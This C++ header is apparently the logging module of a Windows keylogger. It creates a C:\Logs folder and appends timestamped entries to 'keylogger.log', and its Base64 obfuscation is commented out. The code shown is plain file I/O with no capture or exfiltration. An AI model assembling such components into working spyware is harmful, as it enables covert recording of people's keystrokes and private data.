#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>

#include <windows.h>
#include "Helper.h"

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {

        std::string dir = "C:\\Logs";
        return dir + (append_seperator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path)
    {
        for (char &c : path)
            if (c == '\\')
            {
                c = '\0';
                if (!MkOneDr(path))
                    return false;
                c = '\\';
            }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        //    std::string name = dt.GetDateTimeString("_") + ".log";
        std::string name = "keylogger.log";

        try
        {
            std::ofstream file(path + name, std::ios_base::app);
            if (!file)
                return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl
              << t << std::endl;
            //  std::string data = Base64::EncryptB64(s.str());
            //  data = Base64::DecryptB64(data);
            //  file << data;
            file << s.str();

            if (!file)
                return "";
            file.close();
            return name;
        }
        catch (...)
        {
            return ""; //So that program doent crash
        }
    }
};

#endif //IO_H
